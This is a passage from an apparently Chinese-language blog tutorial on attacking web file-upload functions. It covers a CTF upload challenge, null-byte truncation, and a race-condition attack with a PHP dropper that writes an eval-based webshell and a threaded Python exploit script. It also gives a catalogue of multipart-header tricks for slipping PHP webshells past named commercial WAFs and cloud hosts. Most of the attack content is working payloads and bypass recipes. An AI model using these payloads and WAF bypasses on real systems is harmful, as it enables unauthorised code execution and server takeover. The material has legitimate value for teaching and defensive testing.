class="hljs-attr">sandbox</span>);</span><span class="hljs-tag">#@<span class="hljs-attr">chdir</span>($<span class="hljs-attr">sandbox</span>);</span><span class="hljs-tag"></span><span class="hljs-tag"><span class="hljs-attr">if</span> (!<span class="hljs-attr">empty</span>($<span class="hljs-attr">_FILES</span>[&#x27;<span class="hljs-attr">file</span>&#x27;])) &#123;</span><span class="hljs-tag">    #<span class="hljs-attr">mime</span> <span class="hljs-attr">check</span></span><span class="hljs-tag">    <span class="hljs-attr">if</span> (!<span class="hljs-attr">in_array</span>($<span class="hljs-attr">_FILES</span>[&#x27;<span class="hljs-attr">file</span>&#x27;][&#x27;<span class="hljs-attr">type</span>&#x27;], [&#x27;<span class="hljs-attr">image</span>/<span class="hljs-attr">jpeg</span>&#x27;, &#x27;<span class="hljs-attr">image</span>/<span class="hljs-attr">png</span>&#x27;, &#x27;<span class="hljs-attr">image</span>/<span class="hljs-attr">gif</span>&#x27;])) &#123;</span><span class="hljs-tag">        <span class="hljs-attr">die</span>(&#x27;<span class="hljs-attr">This</span> <span class="hljs-attr">type</span> <span class="hljs-attr">is</span> <span class="hljs-attr">not</span> <span class="hljs-attr">allowed</span>!&#x27;);</span><span class="hljs-tag">    &#125;<span class="hljs-attr">else</span>&#123;</span><span class="hljs-tag">        <span class="hljs-attr">echo</span> &quot;<span class="hljs-attr">pass</span> <span class="hljs-attr">1n</span>&quot;;</span><span class="hljs-tag">    &#125;</span><span class="hljs-tag"></span><span class="hljs-tag">    #<span class="hljs-attr">check</span> <span class="hljs-attr">filename</span></span><span class="hljs-tag">    $<span class="hljs-attr">file</span> = <span class="hljs-string">empty($_POST[</span>&#x27;<span class="hljs-attr">filename</span>&#x27;]) ? $<span class="hljs-attr">_FILES</span>[&#x27;<span class="hljs-attr">file</span>&#x27;][&#x27;<span class="hljs-attr">name</span>&#x27;] <span class="hljs-attr">:</span> $<span class="hljs-attr">_POST</span>[&#x27;<span class="hljs-attr">filename</span>&#x27;];</span><span class="hljs-tag">    <span class="hljs-attr">if</span> (!<span class="hljs-attr">is_array</span>($<span class="hljs-attr">file</span>)) &#123;</span><span class="hljs-tag">        $<span class="hljs-attr">file</span> = <span class="hljs-string">explode(</span>&#x27;<span class="hljs-attr">.</span>&#x27;, <span class="hljs-attr">strtolower</span>($<span class="hljs-attr">file</span>));</span><span class="hljs-tag">    &#125;</span><span class="hljs-tag">    $<span class="hljs-attr">ext</span> = <span class="hljs-string">end($file);</span></span><span class="hljs-tag">    <span class="hljs-attr">if</span> (!<span class="hljs-attr">in_array</span>($<span class="hljs-attr">ext</span>, [&#x27;<span class="hljs-attr">jpg</span>&#x27;, &#x27;<span class="hljs-attr">png</span>&#x27;, &#x27;<span class="hljs-attr">gif</span>&#x27;])) &#123;</span><span class="hljs-tag">        <span class="hljs-attr">die</span>(&#x27;<span class="hljs-attr">This</span> <span class="hljs-attr">file</span> <span class="hljs-attr">is</span> <span class="hljs-attr">not</span> <span class="hljs-attr">allowed</span>!&#x27;);</span><span class="hljs-tag">    &#125;<span class="hljs-attr">else</span>&#123;</span><span class="hljs-tag">        <span class="hljs-attr">echo</span> &quot;<span class="hljs-attr">pass</span> <span class="hljs-attr">2n</span>&quot;;</span><span class="hljs-tag">    &#125;</span><span class="hljs-tag"></span><span class="hljs-tag">    $<span class="hljs-attr">filename</span> = <span class="hljs-string">reset($file)</span> <span class="hljs-attr">.</span> &#x27;<span class="hljs-attr">.</span>&#x27; <span class="hljs-attr">.</span> $<span class="hljs-attr">file</span>[<span class="hljs-attr">count</span>($<span class="hljs-attr">file</span>) <span class="hljs-attr">-</span> <span class="hljs-attr">1</span>];</span><span class="hljs-tag">    <span class="hljs-attr">if</span> (<span class="hljs-attr">move_uploaded_file</span>($<span class="hljs-attr">_FILES</span>[&#x27;<span class="hljs-attr">file</span>&#x27;][&#x27;<span class="hljs-attr">tmp_name</span>&#x27;], $<span class="hljs-attr">sandbox</span> <span class="hljs-attr">.</span> &#x27;/&#x27; <span class="hljs-attr">.</span> $<span class="hljs-attr">filename</span>)) &#123;</span><span class="hljs-tag">        <span class="hljs-attr">echo</span> &#x27;<span class="hljs-attr">Success</span>!&#x27;;</span><span class="hljs-tag">        <span class="hljs-attr">echo</span> &#x27;<span class="hljs-attr">filepath:</span>&#x27; <span class="hljs-attr">.</span> $<span class="hljs-attr">sandbox</span> <span class="hljs-attr">.</span> &#x27;/&#x27; <span class="hljs-attr">.</span> $<span class="hljs-attr">filename</span>;</span><span class="hljs-tag">    &#125; <span class="hljs-attr">else</span> &#123;</span><span class="hljs-tag">        <span class="hljs-attr">echo</span> &#x27;<span class="hljs-attr">Failed</span>!&#x27;;</span><span class="hljs-tag">    &#125;</span><span class="hljs-tag">&#125;</span><span class="hljs-tag"><span class="hljs-attr">show_source</span>(<span class="hljs-attr">__file__</span>);</span><span class="hljs-tag">?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Upload Your Shell<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>Filename:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>审计源码可以知道，代码中用 end 函数取到上传文件的后缀并判断，用 reset 函数返回的值作为文件名</p><p>根据题目，需要绕过两层判断。</p><p>1.第一层，直接抓包修改 MIME 为 image/png 就行了。</p><p>2.第二层，构造 filename 字段为数组</p><p>仔细看 html 代码中提供了一个 filename 字段，在下面这句代码的判断中，会先查看是否有直接 post 提交的 filename 字段，如果有的话就使用这个字段的值（这个就有点类似提示的作用）</p><pre><code class="hljs markdown">$file = empty($<span class="hljs-emphasis">_POST[<span class="hljs-string">&#x27;filename&#x27;</span>]) ? $_</span>FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-symbol">&#x27;name&#x27;</span>] : $<span class="hljs-emphasis">_POST[&#x27;filename&#x27;];</span></code></pre><p>在本地复现一下，抓包之后看看：</p><p>抓包重放之后，如果这里 filename 字段我们填上 shell.php ，根据上面的那句代码的判断</p><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span> = <span class="hljs-string">&#x27;shell.php&#x27;</span></code></pre><p>如果没有在 filename 字段中填入 shell.php 的话，那么</p><pre><code class="hljs arcade"><span class="hljs-symbol">$file</span> = <span class="hljs-string">&#x27;1.php&#x27;</span></code></pre><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214014326613.png" alt="image-20210214014326613"></p><p>若直接是这样的话，在下面的几句判断中就无法通过</p><pre><code class="hljs lisp">if (!in_array($ext, [&#x27;jpg&#x27;, &#x27;png&#x27;, &#x27;gif&#x27;]))</code></pre><p>所以这里想要绕过他的判断直接上传 php 文件的话，只能构造 filename 为数组，通过 end 函数的缺陷来绕过下面的的条件判断。</p><p>这里的 end 函数取到了第二个给数组赋值的值，也就是 filename[0] ，reset 函数的值为 filename[1]。这边构造</p><pre><code class="hljs angelscript">filename[<span class="hljs-number">1</span>] = phpfilename[<span class="hljs-number">0</span>] = png</code></pre><p>在后面拼接 $filename 时候，再一次拼接到后缀名，即</p><pre><code class="hljs sql">$filename = <span class="hljs-keyword">reset</span>($<span class="hljs-keyword">file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . $<span class="hljs-keyword">file</span>[<span class="hljs-keyword">count</span>($<span class="hljs-keyword">file</span>) - <span class="hljs-number">1</span>];</code></pre><p>这里的</p><pre><code class="hljs applescript">$<span class="hljs-built_in">file</span>[<span class="hljs-built_in">count</span>($<span class="hljs-built_in">file</span>) - <span class="hljs-number">1</span>]</code></pre><p>一定是取到 filename[1]，所以上面给 filename[1] 赋值为 php 的意义就在这里。</p><p>最后拼接出了 php.php，就达到了上传 shell 的目的.</p><h3 id="5-服务端目录路径校验"><a href="#5-服务端目录路径校验" class="headerlink" title="5.服务端目录路径校验"></a>5.服务端目录路径校验</h3><p><strong>原理</strong></p><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;$msg = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    $file_ext = substr($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        $img_path = $_GET[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;        <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        $msg = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;    &#125;&#125;</code></pre><p><strong>绕过</strong></p><p>存在path参数可控，配合<strong>web服务器解析漏洞</strong>上传webshell</p><p>00截断：</p><p> <code>GET:/upload/1.php%001.jpg</code><br><code>POST:在文件名后burpsuite添加二进制00</code></p><p>适用场合</p><pre><code class="hljs crystal"><span class="hljs-keyword">include</span>(<span class="hljs-keyword">require</span>)file_get_contentsfile_exists所有url中参数可以用%<span class="hljs-number">0</span>0控制</code></pre><h3 id="6-条件竞争"><a href="#6-条件竞争" class="headerlink" title="6.条件竞争"></a>6.条件竞争</h3><p>由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>服务端校验代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$allowtype = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);$size = <span class="hljs-number">10000000</span>;$path = <span class="hljs-string">&quot;./&quot;</span>;$filename = $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-keyword">if</span>(is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;    <span class="hljs-keyword">if</span>(!move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],$path.$filename))&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);&#125;$newfile = $path.$filename;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success.file path is: &quot;</span>.$newfile.<span class="hljs-string">&quot;\n&lt;br /&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);&#125;$ext = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<span class="hljs-keyword">if</span>(!in_array($ext,$allowtype))&#123;    unlink($newfile);    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&quot;./info.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span>Copy</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> threading<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RaceCondition</span>(<span class="hljs-params">threading.Thread</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        threading.Thread.__init__(self)        self.url = <span class="hljs-string">&quot;http://127.0.0.1:8080/upload/shell0.php&quot;</span>        self.uploadUrl = <span class="hljs-string">&quot;http://127.0.0.1:8080/upload/copy.php&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_get</span>(<span class="hljs-params">self</span>):</span>        print(<span class="hljs-string">&#x27;try to call uploaded file...&#x27;</span>)        r = requests.get(self.url)        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:            print(<span class="hljs-string">&quot;[*]create file info.php success&quot;</span>)            os._exit(<span class="hljs-number">0</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_upload</span>(<span class="hljs-params">self</span>):</span>        print(<span class="hljs-string">&quot;upload file.....&quot;</span>)        file = &#123;<span class="hljs-string">&quot;file&quot;</span>:open(<span class="hljs-string">&quot;shell0.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)&#125;        requests.post(self.uploadUrl, files=file)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):                self._get()            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):                self._upload()                self._get()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    threads = <span class="hljs-number">20</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(threads):        t = RaceCondition()        t.start()    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(threads):        t.join()</code></pre><p>关于这方面在ctf中比较常见，参考：<a href="https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app">https://blog.csdn.net/iamsongyu/article/details/83346260?utm_source=app</a></p><h2 id="3-cms、编辑器漏洞"><a href="#3-cms、编辑器漏洞" class="headerlink" title="3.cms、编辑器漏洞"></a>3.cms、编辑器漏洞</h2><h3 id="1-CMS漏洞"><a href="#1-CMS漏洞" class="headerlink" title="1.CMS漏洞"></a>1.CMS漏洞</h3><p>针对不同CMS存在的上传漏洞进行绕过，这个体现出前期信息收集的重要性了，得到各种信息后百度谷歌相应的漏洞。</p><h3 id="2-编辑器漏洞"><a href="#2-编辑器漏洞" class="headerlink" title="2.编辑器漏洞"></a>2.编辑器漏洞</h3><p>比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210210180736302.png" alt="image-20210210180736302"></p><p>还可参考：<a href="https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/">https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/</a></p><h2 id="4-bypassWAF"><a href="#4-bypassWAF" class="headerlink" title="4.bypassWAF"></a>4.bypassWAF</h2><p><strong>前言</strong></p><p>一般bypasswaf有四个方面</p><ul><li>从架构层Bypass WAF 。</li><li>从资源限角度bypass WAF。</li><li>从协议层面bypass WAF。</li><li>从规则缺陷bypass WAF。</li></ul><p>但是就文件上传来说，本人目前还没有深入到怎样从架构或者资源层面绕过waf，所以本文均从协议、规则层面来绕过waf。有关bypasswaf的具体详情参考：<a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%E6%96%87%E7%AB%A0%E3%80%82">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102，这是一篇非常不错的文章。</a></p><p><strong>waf位置</strong></p><p><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210214204416120.png" alt="image-20210214204416120"></p><h3 id="1-waf校验"><a href="#1-waf校验" class="headerlink" title="1.waf校验"></a>1.waf校验</h3><p>上传文件时waf检查文件的位置：</p><ol><li><p>请求的url</p></li><li><p>Boundary边界</p></li><li><p>MIME类型</p></li><li><p>文件扩展名</p></li><li><p>文件内容</p></li></ol><h3 id="2-bypasswaf"><a href="#2-bypasswaf" class="headerlink" title="2.bypasswaf"></a>2.bypasswaf</h3><h4 id="1-后缀"><a href="#1-后缀" class="headerlink" title="1.后缀"></a>1.后缀</h4><p>常见的后缀黑名单</p><pre><code class="hljs smalltalk">asp|asa|cer|cdx|aspx|ashx|ascx|asaxphp|php2|php3|php4|php5|asis|htaccesshtm|html|shtml|pwml|phtml|phtm|js|jspvbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</code></pre><p>这算是比较全的黑名单了吧，一般来说，不存在黑名单绕过的情况，除非开发人员水的一逼。。。</p><p>其实这一部分和<strong>服务端校验后缀差不多</strong>。</p><h4 id="2-HTTP数据包"><a href="#2-HTTP数据包" class="headerlink" title="2.HTTP数据包"></a>2.HTTP数据包</h4><p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。</p><h5 id="1-常见waf绕过"><a href="#1-常见waf绕过" class="headerlink" title="1.常见waf绕过"></a>1.常见waf绕过</h5><p><strong>安全狗绕过</strong></p><p>1.绕过思路：对文件的数据包进行处理。</p><pre><code class="hljs fortran">关键点在这里Content-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;ian.php&quot;</span>将<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>;            修改为~<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>;</code></pre><p>2.通过替换大小写来进行绕过</p><pre><code class="hljs irpf90">Content-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;yjh.php&quot;</span>Content-<span class="hljs-keyword">Type</span>: application/octet-stream将Content-Disposition    修改为content-Disposition将 <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>            修改为<span class="hljs-keyword">Form</span>-<span class="hljs-keyword">data</span>将 Content-<span class="hljs-keyword">Type</span>         修改为content-<span class="hljs-keyword">Type</span></code></pre><p>3.通过删减空格来进行绕过</p><pre><code class="hljs irpf90">Content-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;yjh.php&quot;</span>Content-<span class="hljs-keyword">Type</span>: application/octet-stream将Content-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>          冒号后面 增加或减少一个空格将<span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;file&quot;</span>;                分号后面 增加或减少一个空格将 Content-<span class="hljs-keyword">Type</span>: application/octet-stream   冒号后面 增加一个空格</code></pre><p>4.通过字符串拼接绕过</p><pre><code class="hljs fortran">看Content-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;yjh3.php&quot;</span>将 <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span> 修改为   f+orm-<span class="hljs-keyword">data</span>将 from-<span class="hljs-keyword">data</span> 修改为   <span class="hljs-keyword">form</span>-d+ata</code></pre><p>5.双文件上传绕过</p><pre><code class="hljs pgsql">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; <span class="hljs-keyword">method</span>=&quot;post&quot;<span class="hljs-type">name</span>=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-type">name</span>=&quot;FileName1&quot; <span class="hljs-keyword">type</span>=&quot;FILE&quot; <span class="hljs-keyword">class</span>=&quot;tx1&quot; size=&quot;40&quot;&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-type">name</span>=&quot;FileName2&quot; <span class="hljs-keyword">type</span>=&quot;FILE&quot; <span class="hljs-keyword">class</span>=&quot;tx1&quot; size=&quot;40&quot;&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;submit&quot; <span class="hljs-type">name</span>=&quot;Submit&quot; <span class="hljs-keyword">value</span>=&quot;上传&quot;&gt;&lt;/form&gt;</code></pre><p>6.HTTP header 属性值绕过</p><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;yjh.php&quot;</span>我们通过替换form-data 为*来绕过Content-Disposition: *; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;yjh.php&quot;</span></code></pre><p>7.HTTP header 属性名称绕过</p><pre><code class="hljs routeros">源代码:Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png&quot;</span>Content-Type: image/png绕过内容如下：Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png</span><span class="hljs-string">C.php&quot;</span>删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php<span class="hljs-string">&quot;.</span></code></pre><p>8.等效替换绕过</p><pre><code class="hljs haskell">原内容：<span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary=<span class="hljs-comment">---------------------------471463142114</span></span>修改后:<span class="hljs-type">Content</span>-<span class="hljs-type">Type</span>: multipart/form-<span class="hljs-class"><span class="hljs-keyword">data</span>; boundary =<span class="hljs-comment">---------------------------471463142114</span></span><span class="hljs-title">boundary</span>后面加入空格。</code></pre><p>9.修改编码绕过</p><pre><code class="hljs angelscript">使用UTF<span class="hljs-number">-16</span>、Unicode、双URL编码等等</code></pre><p><strong>WTS-WAF 绕过上传</strong></p><pre><code class="hljs routeros">原内容：Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;up_picture&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;xss.php&quot;</span>添加回车Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;up_picture&quot;</span>; file<span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;xss.php&quot;</span></code></pre><p><strong>百度云上传绕过</strong></p><pre><code class="hljs routeros">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;up_picture&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;xss.jpg .Php&quot;</span></code></pre><p><strong>阿里云上传绕过</strong></p><pre><code class="hljs routeros">源代码：Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;img_crop_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;1.jpg .Php&quot;</span>Content-Type: image/jpeg修改如下：Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;img_crop_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;1.php&quot;</span>没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</code></pre><p><strong>360主机上传绕过</strong></p><pre><code class="hljs routeros">源代码:Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png&quot;</span>Content-Type: image/png绕过内容如下：Content- Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;image&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;085733uykwusqcs8vw8wky.png</span><span class="hljs-string">Content-Disposition 修改为 Content-空格Disposition</span></code></pre><h5 id="2-常规绕过手法"><a href="#2-常规绕过手法" class="headerlink" title="2.常规绕过手法"></a>2.常规绕过手法</h5><p><strong>MIME类型绕过</strong></p><pre><code class="hljs ada">上传木马时，提示格式错误。直接抓包修改Content-<span class="hljs-keyword">Type</span> <span class="hljs-type">为正确的格式尝试绕过</span></code></pre><p><strong>CONTENT-LENGTH绕过</strong></p><pre><code class="hljs plain">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</code></pre><p>下面内容，都是基于文件名解析。</p><p><strong>垃圾数据填充绕过</strong></p><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p><ul><li>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验<br><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210215001437086.png" alt="image-20210215001437086"></li><li>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验<br><img src="/2020/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210215001504949.png" 